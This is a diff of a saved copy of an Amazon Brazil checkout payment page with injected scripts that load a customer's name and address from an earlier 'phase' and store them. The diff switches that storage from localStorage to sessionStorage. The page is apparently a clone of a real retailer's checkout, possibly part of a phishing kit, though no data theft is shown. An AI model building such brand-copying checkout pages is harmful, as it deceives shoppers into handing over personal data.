@@ -1,4 +1,4 @@
-<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0 awa-browser wpn-supported" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 style><!--
+﻿<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0 awa-browser wpn-supported" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 style><!--
  Page saved with SingleFile 
  url: https://www.amazon.com.br/checkout/p/p-703-9642950-1659406/pay?pipelineType=Chewbacca&hasWorkingJavascript=1 
  saved date: Tue Apr 14 2026 12:28:37 GMT-0300 (Horário Padrão de Brasília)
@@ -1126,7 +1126,7 @@ footer, .nav-ftr-batmobile, #nav-ftr {
     }
 
     // Carregar dados da Fase 1
-    var raw = localStorage.getItem('checkout_address');
+    var raw = sessionStorage.getItem('checkout_address');
     if (!raw) return;
     var data = JSON.parse(raw);
     
@@ -1321,7 +1321,7 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    var raw = localStorage.getItem('checkout_address');
+    var raw = sessionStorage.getItem('checkout_address');
     if (!raw) return;
 
     var data;
@@ -1352,8 +1352,8 @@ document.addEventListener('DOMContentLoaded', function() {
         customerAddress.textContent = endereco;
     }
 
-    localStorage.setItem('user_name', nome);
-    localStorage.setItem('user_full_address', endereco);
+    sessionStorage.setItem('user_name', nome);
+    sessionStorage.setItem('user_full_address', endereco);
 });
 </script>
     <script src="meta-attribution.js"></script>
